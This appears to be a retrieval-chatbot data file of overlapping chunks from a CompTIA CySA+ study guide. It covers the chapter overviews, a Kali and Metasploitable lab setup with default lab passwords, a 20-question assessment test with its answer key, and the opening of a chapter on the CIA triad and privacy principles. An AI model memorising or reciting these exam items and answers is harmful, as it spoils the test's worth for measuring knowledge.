huge amounts of data about potential problems with systems. In this chapter, you will learn how to read and analyze a vulnerability scan report, what CVSS scoring is and what it means, as well as how to choose the appropriate actions to remediate the issues you have found. Along the way, you will explore common types of vulnerabilities and their impact on systems and networks. Chapter 8: Responding to Vulnerabilities In this chapter, we turn our attention to what happens after a vulnerability is discovered—­the ways that organizations respond to vulnerabilities that exist in their environments. We’ll begin with coverage of the risk management process and then dive into some of the specific ways that you can respond to vulnerabilities. Chapter 9: Building an Incident Response Program This chapter focuses on building a formal incident response handling program
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the appropriate actions to remediate the issues you have found. Along the way, you will explore common types of vulnerabilities and their impact on systems and networks. Chapter 8: Responding to Vulnerabilities In this chapter, we turn our attention to what happens after a vulnerability is discovered—­the ways that organizations respond to vulnerabilities that exist in their environments. We’ll begin with coverage of the risk management process and then dive into some of the specific ways that you can respond to vulnerabilities. Chapter 9: Building an Incident Response Program This chapter focuses on building a formal incident response handling program and team. You will learn the details of each stage of incident handling from preparation, to detection and analysis, to containment, eradication, and recovery, to the final post-­incident recovery, as well as how to classify incidents and communicate about them. xxvi Introduction Chapter 10: Incident Detection and Analysis Security professionals monitor for indicators of compromise, and once found they are analyzed to determine if an incident happened. In this chapter you will explore IoCs related to networks, systems, services, and applications. You will also dive into data and log analysis as well as evidence acquisition and analysis. Chapter 11: Containment, Eradication, and Recovery Once an incident has occurred and the initial phases of incident response have taken place, you will need to work on recovering from it. That process involves containing the incident to ensure that no further issues occur and then working on eradicating malware, rootkits, and other elements of a compromise. Once the incident has been cleaned up, the recovery stage can start, including reporting and preparation for future issues. Chapter 12: Reporting and Communication Communications and reporting are key to ensuring organizations digest and use information about vulnerabilities and incidents. In this chapter you’ll explore both communication related to vulnerability management and incident response. You’ll explore how to leverage vulnerability management and risk scores while understanding the most common inhibitors to remediation. You’ll also look at incident reports, how to engage stakeholders, and how lessons learned can be gathered and used. Chapter 13: Performing Forensic Analysis and Techniques for Incident Response Understanding what occurred on a system, device, or network, either as part of an incident or for other purposes, frequently involves forensic analysis. In this chapter, you will learn how to build a forensic capability and how the key tools in a forensic toolkit are used. Appendix: Answers to Review Questions The appendix has answers to the review questions you will find at the end of each chapter. Study Guide Elements This study guide uses a number of common elements to help you prepare. These include the following: Summaries The Summary section of each chapter briefly explains the chapter, allowing you to easily understand what it covers. Exam Essentials The Exam Essentials focus on major exam topics and critical knowledge that you should take into the test. The Exam Essentials focus on the exam objectives provided by CompTIA. Review Questions A set of questions at the
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Appendix: Answers to Review Questions The appendix has answers to the review questions you will find at the end of each chapter. Study Guide Elements This study guide uses a number of common elements to help you prepare. These include the following: Summaries The Summary section of each chapter briefly explains the chapter, allowing you to easily understand what it covers. Exam Essentials The Exam Essentials focus on major exam topics and critical knowledge that you should take into the test. The Exam Essentials focus on the exam objectives provided by CompTIA. Review Questions A set of questions at the end of each chapter will help you assess your knowledge and if you are ready to take the exam based on your knowledge of that chapter’s topics. Lab Exercises The written labs provide more in-­depth practice opportunities to expand your skills and to better prepare for performance-­based testing on the CySA+ exam. Introduction xxvii Exam Note These special notes call out issues that are found on the exam and relate directly to CySA+ exam objectives. They help you prepare for the why and how. Interactive Online Learning Environment and Test Bank We’ve put together some really great online tools to help you pass the CompTIA CySA+ exam. The interactive online learning environment that accompanies CompTIA® CySA+ Study Guide: Exam CS0-003 provides a test bank and study tools to help you prepare for the exam. By using these tools you can dramatically increase your chances of passing the exam on your first try. Go to www.wiley.com/go/sybextestprep to register and gain access to this interactive online learning environment and test bank with study tools. Like all exams, the Exam CS0-003: CompTIA® CySA+ is updated periodically and may eventually be retired or replaced. At some point after CompTIA is no longer offering this exam, the old editions of our books and online tools will be retired. If you have purchased this book after the exam was retired or are attempting to register in the Sybex online learning environment after the exam was retired, please know that we make no guarantees that this exam’s online Sybex tools will be available once the exam is no longer available. The online test bank includes the following: Sample Tests Many practice questions are provided throughout this book and online, including the questions in the Assessment Test, which you’ll find at the end of this introduction, and the questions in the Chapter Tests, which include the review questions at the end of each chapter. In addition, there is a custom practice exam. Use all these practice questions to test your knowledge of the Study Guide material. The online test bank runs on multiple devices. Flashcards The online text bank includes over 100 flashcards especifically written to test your knowledge, so don’t get discouraged if you don’t ace your way through them at first! They’re there to ensure that you know critical terms and concepts and you’re really ready for the exam. And no worries—armed with the review questions,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	questions in the Chapter Tests, which include the review questions at the end of each chapter. In addition, there is a custom practice exam. Use all these practice questions to test your knowledge of the Study Guide material. The online test bank runs on multiple devices. Flashcards The online text bank includes over 100 flashcards especifically written to test your knowledge, so don’t get discouraged if you don’t ace your way through them at first! They’re there to ensure that you know critical terms and concepts and you’re really ready for the exam. And no worries—armed with the review questions, practice exam, and flashcards, xxviii Introduction you’ll be more than prepared when exam day comes! Questions are provided in digital flashcard format (a question followed by a single correct answer). You can use the flashcards to reinforce your learning and provide last-minute test prep before the exam. Other Study Tools A glossary of key terms from this book and their definitions are available as a fully searchable PDF. Objectives Map for CompTIA CySA+ Exam CS0-­0 03 The following objectives’ map for the CompTIA CySA+ certification exam will enable you to find the chapter in this book that covers each objective for the exam. Objectives Map Objective Chapter(s) 1.0 Security Operations 1.1 Explain the importance of system and network architecture concepts in security operations 2 1.2 Given a scenario, analyze indicators of potentially malicious activity 3 1.3 Given a scenario, use appropriate tools or techniques to determine malicious activity 3 1.4 Compare and contrast threat intelligence and threat-­hunting concepts 4 1.5 Explain the importance of efficiency and process improvement in secu- 1 rity operations 2.0 Vulnerability Management 2.1 Given a scenario, implement vulnerability scanning methods and concepts 1, 5, 6, 7, 8 2.2 Given a scenario, analyze output from vulnerability assessment tools 5, 6, 8 2.3 Given a scenario, analyze data to prioritize vulnerabilities 7 2.4 Given a scenario, recommend controls to mitigate attacks and software vulnerabilities 7 Introduction Objective Chapter(s) 2.5 Explain concepts related to vulnerability response, handling, and management 8 xxix 3.0 Incident Response and Management 3.1 Explain concepts related to attack methodology frameworks 9 3.2 Given a scenario, perform incident response activities 9, 10, 11, 13 3.3 Explain the preparation and post-­incident activity phases of the incident management life cycle 9, 13 4.0 Reporting and Communication 4.1 Explain the importance of vulnerability management reporting and communication 12 4.2 Explain the importance of incident response reporting and communication 12 Setting Up a Kali and Metasploitable Learning Environment You can practice many of the techniques found in this book using open source and free tools. This section provides a brief “how to” guide to set up a Kali Linux, a Linux distribution built as a broad security toolkit, and Metasploitable, an intentionally vulnerable Linux virtual machine. What You Need To build a basic virtual security lab environment to run scenarios and to learn applications and tools used in this book, you will need a virtualization program and virtual machines. There
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Explain the importance of incident response reporting and communication 12 Setting Up a Kali and Metasploitable Learning Environment You can practice many of the techniques found in this book using open source and free tools. This section provides a brief “how to” guide to set up a Kali Linux, a Linux distribution built as a broad security toolkit, and Metasploitable, an intentionally vulnerable Linux virtual machine. What You Need To build a basic virtual security lab environment to run scenarios and to learn applications and tools used in this book, you will need a virtualization program and virtual machines. There are many excellent security-­oriented distributions and tools beyond those in this example, and you may want to explore tools like Security Onion, the SANS SIFT forensic distribution, and CAINE as you gain experience. Running virtual machines can require a reasonably capable PC. We like to recommend an i5 or i7 (or equivalent) CPU, at least 8 GB of RAM, and 20 GB of open space available for virtual machines. xxx Introduction VirtualBox VirtualBox is a virtualization software package for x86 computers, and is available for Windows, macOS, and Linux. You can download VirtualBox at www.virtualbox.org/wiki/ Downloads. If you are more familiar with another virtualization tool like VMware or Hyper-­V, you can also use those tools; however, you may have to adapt or modify these instructions to handle differences in how your preferred virtualization environment works. Kali Linux Multiple versions of Kali Linux are available at www.kali.org/downloads, including prebuilt virtual machines. We suggest downloading the most recent version of the Kali Linux 64-­bit VirtualBox virtual machine if you’re following these instructions or the appropriate version for your virtualization tool if you’re using an alternate solution. You will need to unzip the downloaded files to use them. Metasploitable You can download the Metasploitable virtual machine at http://sourceforge.net/ projects/metasploitable. As with Kali Linux, you will need to unzip the files to use them. VirtualBox expects its virtual machines to be in OVF format, so you will need to convert the Metasploitable VMware files to OVF. You can use the Open Virtualization Format Tool (ovftool) from VMware found at https://developer.vmware.com/web/tool/4.4.0/ ovf to make this change. You will need to create a VMware account to download the file. Instructions for how to make the change can be found at https://theautomationblog .com/converting-­a-­vmware-­vmx-­file-­for-­use-­in-­virtualbox. On the system used to prepare these instructions, that meant navigating to C:\ Program Files\VMware\Vmware OVF Tool\, then running a command line: ovftool .exe C:\Users\sampleuser\Downloads\metasploitable-­linux-­2.0.0\ Metasploitable2-­Linux\Metasploitable.vmx C:\Users\sampleuser\ Downloads\metasploitable.ova to create the OVA file in a temporary downloads folder. You may want to place the files in another location. Usernames and Passwords Kali’s default username is kali with the kali password. The Metasploitable virtual machine uses the username msfadmin and the msfadmin password. If you will ever expose either system to a live network, or you aren’t sure if you will, you should change the passwords immediately after booting the virtual machines the first time. Introduction xxxi Setting Up Your Environment Setting up VirtualBox is
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Files\VMware\Vmware OVF Tool\, then running a command line: ovftool .exe C:\Users\sampleuser\Downloads\metasploitable-­linux-­2.0.0\ Metasploitable2-­Linux\Metasploitable.vmx C:\Users\sampleuser\ Downloads\metasploitable.ova to create the OVA file in a temporary downloads folder. You may want to place the files in another location. Usernames and Passwords Kali’s default username is kali with the kali password. The Metasploitable virtual machine uses the username msfadmin and the msfadmin password. If you will ever expose either system to a live network, or you aren’t sure if you will, you should change the passwords immediately after booting the virtual machines the first time. Introduction xxxi Setting Up Your Environment Setting up VirtualBox is quite simple. First, install the VirtualBox application. Once it is installed and you select your language, you should see a VirtualBox window like the one in Figure I.1. FIGURE I.1 VirtualBox main screen To add the Kali Linux virtual machine, click the Add button. Navigate to the directory where you downloaded the Kali VM and add the virtual machine. Follow the wizard as it guides you through the import process, and when it is complete, you can continue with these instructions. 1. Click New in the VirtualBox main window. 2. Click Expert Mode button shown in Figure I.2 and name your system; then select Linux for the type. You can leave the default alone for Version, and you can leave the memory default alone as well. 3. From the File menu select Import Appliance and navigate to where your Metasploitable OVA file is located. You’ll have a chance to review appliance settings and can change the name from the default “vm” and change file locations and network settings if you wish. Introduction xxxii FIGURE I.2 4. Adding the Metasploitable VM Now that you have both virtual machines set up, you should verify their network settings. VirtualBox allows multiple types of networks. Table I.1 shows the critical types of network connections you are likely to want to use with this environment. TA B L E I . 1 Virtual machine network options Network name Description NAT Connect the VM to your real network, through a protected NAT. NAT Network Connect the VM and other VMs together on a protected network segment, which is also NAT’ed out to your real network. Bridged Directly connect your VM to your actual network (possibly allowing it to get a DHCP address, be scanned, or for you to connect to it remotely). Internal Connect the VM to a network that exists only for virtual machines. Host Only Connect the VM to a network that only allows it to see the VM host. Introduction xxxiii In order to connect between the machines, you’ll need to change their default network option from NAT to another option. For the purposes of the labs and exercises in this book, NAT Network is a useful option. To create one, select File ➢ Tools ➢ Network Manager, then select the second tab, NAT Networks, and create one (see Figure I.3). FIGURE I.3 Adding a NAT network If you are not comfortable with
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	to a network that exists only for virtual machines. Host Only Connect the VM to a network that only allows it to see the VM host. Introduction xxxiii In order to connect between the machines, you’ll need to change their default network option from NAT to another option. For the purposes of the labs and exercises in this book, NAT Network is a useful option. To create one, select File ➢ Tools ➢ Network Manager, then select the second tab, NAT Networks, and create one (see Figure I.3). FIGURE I.3 Adding a NAT network If you are not comfortable with your virtual machines having outbound network access, think you may do something dangerous with them, or want to avoid any other potential issues, you should set up both virtual machines to use Internal Network instead. 5. Once your NAT network exists, you can set both machines to use it by clicking on them, then clicking the Settings gear icon in the VirtualBox interface. From there, click Network, and set the network adapter to be attached to the NAT network you just set up. See Figure I.4. xxxiv Introduction FIGURE I.4 6. Configuring VMs for the NAT network Now you’re all set! You can start both machines and test that they can see each other. To do this, simply log into the Metasploitable box and run ifconfig to find its IP address. Use SSH to connect from the Kali Linux system to the Metasploitable system using ssh [ip address] -­ l msfadmin. If you connect and can log in, you’re ready to run exercises between the two systems. How to Contact the Publisher If you believe you’ve found a mistake in this book, please bring it to our attention. At John Wiley & Sons, we understand how important it is to provide our customers with accurate content, but even with our best efforts an error may occur. To submit your possible errata, please email it to our Customer Service Team at wileysupport@wiley.com with the subject line “Possible Book Errata Submission.” Assessment Test xxxv Assessment Test If you’re considering taking the CySA+ exam, you may have already taken and passed the CompTIA Security+ and Network+ exams and should have four years of experience in the field. You may also already hold other equivalent certifications. The following assessment test will help to make sure that you have the knowledge that you should have before you tackle the CySA+ certification and will help you determine where you may want to spend the most time with this book. 1. After running an nmap scan of a system, you receive scan data that indicates the following three ports are open: 22/TCP 443/TCP 1521/TCP What services commonly run on these ports? 2. 3. 4. A. SMTP, NetBIOS, MS-­SQL B. SSH, LDAPS, LDAP C. SSH, HTTPS, Oracle D. FTP, HTTPS, MS-­SQL What type of system allows attackers to believe they have succeeded with their attack, thus providing defenders with information about their attack methods and tools? A. A
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	before you tackle the CySA+ certification and will help you determine where you may want to spend the most time with this book. 1. After running an nmap scan of a system, you receive scan data that indicates the following three ports are open: 22/TCP 443/TCP 1521/TCP What services commonly run on these ports? 2. 3. 4. A. SMTP, NetBIOS, MS-­SQL B. SSH, LDAPS, LDAP C. SSH, HTTPS, Oracle D. FTP, HTTPS, MS-­SQL What type of system allows attackers to believe they have succeeded with their attack, thus providing defenders with information about their attack methods and tools? A. A honeypot B. A sinkhole C. A crackpot D. A darknet What cybersecurity objective could be achieved by running your organization’s web servers in redundant, geographically separate datacenters? A. Confidentiality B. Integrity C. Immutability D. Availability Which of the following vulnerability scanning methods will provide the most accurate detail during a scan? A. Black box/unknown environment B. Authenticated C. Internal view D. External view xxxvi 5. Assessment Test Security researchers recently discovered a flaw in the Chakra JavaScript scripting engine in Microsoft’s Edge browser that could allow remote execution or denial of service via a specifically crafted website. The CVSS 3.1 score for this vulnerability reads: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H What is the attack vector and the impact to integrity based on this rating? 6. 7. 8. 9. A. System, 9, 8 B. Browser, High C. Network, High D. None, High Alice is a security engineer tasked with performing vulnerability scans for her organization. She encounters a false positive error in one of her scans. What should she do about this? A. Verify that it is a false positive, and then document the exception. B. Implement a workaround. C. Update the vulnerability scanner. D. Use an authenticated scan, and then document the vulnerability. Which phase of the incident response process is most likely to include gathering additional evidence such as information that would support legal action? A. Preparation B. Detection and Analysis C. Containment, Eradication, and Recovery D. Post-­incident Activity and Reporting Which of the following descriptions explains an integrity loss? A. Systems were taken offline, resulting in a loss of business income. B. Sensitive or proprietary information was changed or deleted. C. Protected information was accessed or exfiltrated. D. Sensitive personally identifiable information was accessed or exfiltrated. Hui’s incident response program uses metrics to determine if their subscription to and use of IoC feeds is meeting the organization’s requirements. Which of the following incident response metrics is most useful if Hui wants to assess their use of IoC feeds? A. Alert volume metrics B. Mean time to respond metrics C. Mean time to detect metrics D. Mean time to remediate metrics Assessment Test xxxvii 10. Abdul’s monitoring detects regular traffic sent from a system that is suspected to be compromised and participating in a botnet to a set of remote IP addresses. What is this called? A. Anomalous pings B. Probing C. Zombie chatter D. Beaconing 11. What industry standard is used to
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	feeds is meeting the organization’s requirements. Which of the following incident response metrics is most useful if Hui wants to assess their use of IoC feeds? A. Alert volume metrics B. Mean time to respond metrics C. Mean time to detect metrics D. Mean time to remediate metrics Assessment Test xxxvii 10. Abdul’s monitoring detects regular traffic sent from a system that is suspected to be compromised and participating in a botnet to a set of remote IP addresses. What is this called? A. Anomalous pings B. Probing C. Zombie chatter D. Beaconing 11. What industry standard is used to describe risk scores? A. CRS B. CVE C. RSS D. CVSS 12. What term is used to describe the retention of data and information related to pending or active litigation? A. Preservation B. Legal hold C. Criminal hold D. Forensic archiving 13. During a forensic investigation Maria discovers evidence that a crime has been committed. What do organizations typically do to ensure that law enforcement can use data to prosecute a crime? A. Securely wipe drives to prevent further issues B. Document a chain of custody for the forensic data C. Only perform forensic investigation on the original storage media D. Immediately implement a legal hold 14. Oscar’s manager has asked him to ensure that a compromised system has been completely purged of the compromise. What is Oscar’s best course of action? A. Use an antivirus tool to remove any associated malware. B. Use an antimalware tool to completely scan and clean the system. C. Wipe and rebuild the system. D. Restore a recent backup. 15. Which of the following actions is not a common activity during the recovery phase of an incident response process? A. Reviewing accounts and adding new privileges B. Validating that only authorized user accounts are on the systems C. Verifying that all systems are logging properly D. Performing vulnerability scans of all systems Assessment Test xxxviii 16. A statement like “Windows workstations must have the current security configuration template applied to them before being deployed” is most likely to be part of which document? A. Policies B. Standards C. Procedures D. Guidelines 17. A firewall is an example of what type of control? A. Preventive B. Detective C. Responsive D. Corrective 18. Cathy wants to collect network-­based indicators of compromise as part of her security monitoring practice. Which of the following is not a common network-­related IoC? A. Bandwidth consumption B. Rogue devices on the network C. Scheduled updates D. Activity on unexpected ports 19. Nick wants to analyze a potentially malicious software package using an open source, locally hosted tool. Which of the following tools is best suited to his need if he wants to run the tool as part of the process? A. Strings B. A SIEM C. VirusTotal D. Cuckoo Sandbox 20. Which software development life cycle model uses linear development concepts in an iterative, four-­phase process? A. Waterfall B. Agile C. RAD D. Spiral Answers to the Assessment Test xxxix Answers
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	network-­related IoC? A. Bandwidth consumption B. Rogue devices on the network C. Scheduled updates D. Activity on unexpected ports 19. Nick wants to analyze a potentially malicious software package using an open source, locally hosted tool. Which of the following tools is best suited to his need if he wants to run the tool as part of the process? A. Strings B. A SIEM C. VirusTotal D. Cuckoo Sandbox 20. Which software development life cycle model uses linear development concepts in an iterative, four-­phase process? A. Waterfall B. Agile C. RAD D. Spiral Answers to the Assessment Test xxxix Answers to the Assessment Test 1. C. These three TCP ports are associated with SSH (22), HTTPS (443), and Oracle databases (1521). Other ports mentioned in the potential answers are SMTP (25), NetBIOS (137–139), LDAP (389), LDAPS (636) and MS-­SQL (1433/1434). To learn more on this topic, see Chapter 1. 2. A. Honeypots are systems that are designed to look like attractive targets. When they are attacked, they simulate a compromise, providing defenders with a chance to see how attackers operate and what tools they use. DNS sinkholes provide false information to malicious software, redirecting queries about command-and-control (C&C) systems to allow remediation. Darknets are segments of unused network space that are monitored to detect traffic—­since legitimate traffic should never be aimed at the darknet, this can be used to detect attacks and other unwanted traffic. Crackpots are eccentric people—­not a system you’ll run into on a network. To learn more on this topic, see Chapter 4. 3. D. Redundant systems, particularly when run in multiple locations and with other protections to ensure uptime, can help provide availability. To learn more on this topic, see Chapter 1. 4. B. An authenticated, or credentialed, scan provides the most detailed view of the system. Black-­box assessments presume no knowledge of a system and would not have credentials or an agent to work with on the system. Internal views typically provide more detail than external views, but neither provides the same level of detail that credentials can allow. To learn more on this topic, see Chapter 6. 5. C. When reading the CVSS score, AV is the attack vector. Here, N means network. Confidentiality (C), integrity (I), and availability (A) are listed at the end of the listing, and all three are rated as High in this CVSS rating. To learn more on this topic, see Chapter 7. 6. A. When Alice encounters a false positive error in her scans, her first action should be to verify it. This may involve running a more in-­depth scan like an authenticated scan, but it could also involve getting assistance from system administrators, checking documentation, or other validation actions. Once she is done, she should document the exception so that it is properly tracked. Implementing a workaround is not necessary for false positive vulnerabilities, and updating the scanner should be done before every vulnerability scan. Using an authenticated scan might help but does not cover all the
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	topic, see Chapter 7. 6. A. When Alice encounters a false positive error in her scans, her first action should be to verify it. This may involve running a more in-­depth scan like an authenticated scan, but it could also involve getting assistance from system administrators, checking documentation, or other validation actions. Once she is done, she should document the exception so that it is properly tracked. Implementing a workaround is not necessary for false positive vulnerabilities, and updating the scanner should be done before every vulnerability scan. Using an authenticated scan might help but does not cover all the possibilities for validation she may need to use. To learn more on this topic, see Chapter 7. 7. C. The Containment, Eradication, and Recovery phase of an incident includes steps to limit damage and document what occurred, including potentially identifying the attacker and tools used for the attack. This means that information useful to legal actions is most likely to be gathered during this phase. To learn more on this topic, see Chapter 9. 8. B. Integrity breaches involve data being modified or deleted. Systems being taken offline is an availability issue, protected information being accessed might be classified as a breach of proprietary information, and sensitive personally identifiable information breaches would typically be classified as privacy breaches. To learn more on this topic, see Chapter 9. xl 9. Answers to the Assessment Test C. IoCs are used to improve detection, and Hui knows that gathering mean time to detect metrics will help the organization determine if their use of IoC feeds is improving detection speed. Alert volume is driven by configuration and maintenance of alerts, and it would not determine if the IoC usage was appropriate. Response time and remediation time are better used to measure the organization’s processes and procedures. To learn more on this topic, see Chapter 12. 10. D. Regular traffic from compromised systems to command-and-control nodes is known as beaconing. Anomalous pings could describe unexpected pings, but they are not typically part of botnet behavior, zombie chatter is a made-­up term, and probing is part of scanning behavior in some cases. To learn more on this topic, see Chapter 4. 11. D. The Common Vulnerability Scoring System, or CVSS, is used to rate and describe risks. CVE, Common Vulnerabilities and Exposures, classifies vulnerabilities. RSS, or Really Simple Syndication, is used to create feeds of websites. CRS was made up for this question. To learn more on this topic, see Chapter 12. 12. B. The term legal hold is used to describe the retention of data and information related to a pending or active legal investigation. Preservation is a broader term used to describe retention of data for any of a variety of reasons including business requirements. Criminal hold and forensic archiving were made up for this question. To learn more on this topic, see Chapter 13. 13. B. Documenting a proper chain of custody will allow law enforcement to be more likely to use forensic
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	CRS was made up for this question. To learn more on this topic, see Chapter 12. 12. B. The term legal hold is used to describe the retention of data and information related to a pending or active legal investigation. Preservation is a broader term used to describe retention of data for any of a variety of reasons including business requirements. Criminal hold and forensic archiving were made up for this question. To learn more on this topic, see Chapter 13. 13. B. Documenting a proper chain of custody will allow law enforcement to be more likely to use forensic data successfully in court. Wiping drives will cause data loss, forensic examination is done on copies, not original drives, and legal holds are done to preserve data when litigation is occurring or may occur. 14. C. The most foolproof means of ensuring that a system does not remain compromised is to wipe and rebuild it. Without full knowledge of when the compromise occurred, restoring a backup may not help, and both antimalware and antivirus software packages cannot always ensure that no remnant of the compromise remains, particularly if the attacker created accounts or otherwise made changes that wouldn’t be detected as malicious software. To learn more on this topic, see Chapter 11. 15. A. The recovery phase does not typically seek to add new privileges. Validating that only legitimate accounts exist, that the systems are all logging properly, and that systems have been vulnerability scanned are all common parts of an incident response recovery phase. To learn more on this topic, see Chapter 11. 16. B. This statement is most likely to be part of a standard. Policies contain high-­level statements of management intent; standards provide mandatory requirements for how policies are carried out, including statements like that provided in the question. A procedure would include the step-­by-­step process, and a guideline describes a best practice or recommendation. To learn more on this topic, see Chapter 8. 17. A. The main purpose of a firewall is to block malicious traffic before it enters a network, therefore preventing a security incident from occurring. For this reason, it is best classified as a preventive control. To learn more on this topic, see Chapter 8. Answers to the Assessment Test xli 18. C. Scheduled updates are a normal activity on network connected devices. Common indicators of potentially malicious activity include bandwidth consumption, beaconing, irregular peer-­to-­peer communication, rogue devices, scans, unusual traffic spikes, and activity on unexpected ports. To learn more on this topic, see Chapter 3. 19. D. Cuckoo Sandbox is the only item from the list of potential answers that is a locally installed and run sandbox that analyzes potential malware by running it in a safe sandbox environment. To learn more on this topic, see Chapter 3. 20. D. The Spiral model uses linear development concepts like those used in Waterfall but repeats four phases through its life cycle: requirements gathering, design, build, and evaluation. To learn more on this topic,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	irregular peer-­to-­peer communication, rogue devices, scans, unusual traffic spikes, and activity on unexpected ports. To learn more on this topic, see Chapter 3. 19. D. Cuckoo Sandbox is the only item from the list of potential answers that is a locally installed and run sandbox that analyzes potential malware by running it in a safe sandbox environment. To learn more on this topic, see Chapter 3. 20. D. The Spiral model uses linear development concepts like those used in Waterfall but repeats four phases through its life cycle: requirements gathering, design, build, and evaluation. To learn more on this topic, see Chapter 8. Security Operations DOMAIN I Chapter 1 Today’s Cybersecurity Analyst THE COMPTIA CYBERSECURITY ANALYST (CYSA+) EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: ✓✓ Domain 1.0: Security Operations ■■ 1.5 Explain the importance of efficiency and process improvement in security operations ■■ Standardize processes ■■ Streamline operations ■■ Technology and tool integration ■■ Single pane of glass ✓✓ Domain 2.0: Vulnerability Management ■■ 2.1 Given a scenario, implement vulnerability scanning methods and concepts ■■ Static vs. dynamic (reverse engineering) Cybersecurity analysts are responsible for protecting the confidentiality, integrity, and availability of information and information systems used by their organizations. Fulfilling this responsibility requires a commitment to a defense-­in-­depth approach to information security that uses multiple, overlapping security controls to achieve each cybersecurity objective. It also requires that analysts have a strong understanding of the threat environment facing their organization in order to develop a set of controls capable of rising to the occasion and answering those threats. In the first section of this chapter, you will learn how to assess the cybersecurity threats facing your organization and determine the risk that they pose to the confidentiality, integrity, and availability of your operations. In the sections that follow, you will learn about controls that you can put in place to secure networks and endpoints and evaluate the effectiveness of those controls over time. Cybersecurity Objectives When most people think of cybersecurity, they imagine hackers trying to break into an organization’s system and steal sensitive information, ranging from Social Security numbers and credit cards to top-­secret military information. Although protecting sensitive information from unauthorized disclosure is certainly one element of a cybersecurity program, it is important to understand that cybersecurity actually has three complementary objectives, as shown in Figure 1.1. nti de nfi Co rity eg Int ali ty F I G U R E 1. 1 The three key objectives of cybersecurity programs are confidentiality, integrity, and availability. Availability Privacy vs. Security 5 Confidentiality ensures that unauthorized individuals are not able to gain access to sensitive information. Cybersecurity professionals develop and implement security controls, including firewalls, access control lists, and encryption, to prevent unauthorized access to information. Attackers may seek to undermine confidentiality controls to achieve one of their goals: the unauthorized disclosure of sensitive information. Integrity ensures that there are no unauthorized modifications to information or systems, either intentionally or unintentionally. Integrity controls, such as hashing and integrity monitoring
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	G U R E 1. 1 The three key objectives of cybersecurity programs are confidentiality, integrity, and availability. Availability Privacy vs. Security 5 Confidentiality ensures that unauthorized individuals are not able to gain access to sensitive information. Cybersecurity professionals develop and implement security controls, including firewalls, access control lists, and encryption, to prevent unauthorized access to information. Attackers may seek to undermine confidentiality controls to achieve one of their goals: the unauthorized disclosure of sensitive information. Integrity ensures that there are no unauthorized modifications to information or systems, either intentionally or unintentionally. Integrity controls, such as hashing and integrity monitoring solutions, seek to enforce this requirement. Integrity threats may come from attackers seeking the alteration of information without authorization or nonmalicious sources, such as a power spike causing the corruption of information. Availability ensures that information and systems are ready to meet the needs of legitimate users at the time those users request them. Availability controls, such as fault tolerance, clustering, and backups, seek to ensure that legitimate users may gain access as needed. Similar to integrity threats, availability threats may come either from attackers seeking the disruption of access or nonmalicious sources, such as a fire destroying a datacenter that contains valuable information or services. Cybersecurity analysts often refer to these three goals, known as the CIA Triad, when performing their work. They often characterize risks, attacks, and security controls as meeting one or more of the three CIA Triad goals when describing them. Privacy vs. Security Privacy and security are closely related concepts. We just discussed the three major components of security: confidentiality, integrity, and availability. These goals are all focused on the ways that an organization can protect its own data. Confidentiality protects data from unauthorized disclosure. Integrity protects data from unauthorized modification. Availability protects data from unauthorized denial of access. Privacy controls have a different focus. Instead of focusing on ways that an organization can protect its own information, privacy focuses on the ways that an organization can use and share information that it has collected about individuals. This data, known as personally identifiable information (PII), is often protected by regulatory standards and is always governed by ethical considerations. Organizations seek to protect the security of private information and may do so using the same security controls that they use to protect other categories of sensitive information, but privacy obligations extend beyond just security. Privacy extends to include the ways that an organization uses and shares the information that it collects and maintains with others. Exam Note Remember that privacy and security are complementary and overlapping, but they have different objectives. This is an important concept on the exam. 6 Chapter 1 ■ Today’s Cybersecurity Analyst The Generally Accepted Privacy Principles (GAPP) outline 10 privacy practices that organizations should strive to follow: ■■ ■■ ■■ ■■ ■■ ■■ ■■ Management says that the organization should document its privacy practices in a privacy policy and related documents. Notice says that the organization should notify individuals about its
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	to include the ways that an organization uses and shares the information that it collects and maintains with others. Exam Note Remember that privacy and security are complementary and overlapping, but they have different objectives. This is an important concept on the exam. 6 Chapter 1 ■ Today’s Cybersecurity Analyst The Generally Accepted Privacy Principles (GAPP) outline 10 privacy practices that organizations should strive to follow: ■■ ■■ ■■ ■■ ■■ ■■ ■■ Management says that the organization should document its privacy practices in a privacy policy and related documents. Notice says that the organization should notify individuals about its privacy practices and inform individuals of the type of information that it collects and how that information is used. Choice and consent says that the organization should obtain the direct consent of individuals for the storage, use, and sharing of PII. Collection says that the organization should collect PII only for the purposes identified in the notice and consented to by the individual. Use, retention, and disposal says that the organization should only use information for identified purposes and may not use information collected for one stated purpose for any other nondisclosed purpose. Access says that the organization should provide individuals with access to any information about that individual in the organization’s records, at the individual’s request. Disclosure says that the organization will disclose information to third parties only when consistent with notice and consent. ■■ Security says that PII will be protected against unauthorized access. ■■ Quality says that the organization will maintain accurate and complete information. ■■ Monitoring and enforcement says that the organization will put business processes in place to ensure that it remains compliant with its privacy policy. The GAPP principles are strong best practices for building a privacy program. In some jurisdictions and industries, privacy laws require the implementation of several of these principles. For example, the European Union’s (EU) General Data Protection Regulation (GDPR) requires that organizations handling the data of EU residents process personal information in a way that meets privacy requirements. Evaluating Security Risks Cybersecurity risk analysis is the cornerstone of any information security program. Analysts must take the time to thoroughly understand their own technology environments and the external threats that jeopardize their information security. A well-­rounded cybersecurity risk Evaluating Security Risks 7 assessment combines information about internal and external factors to help analysts understand the threats facing their organization and then design an appropriate set of controls to meet those 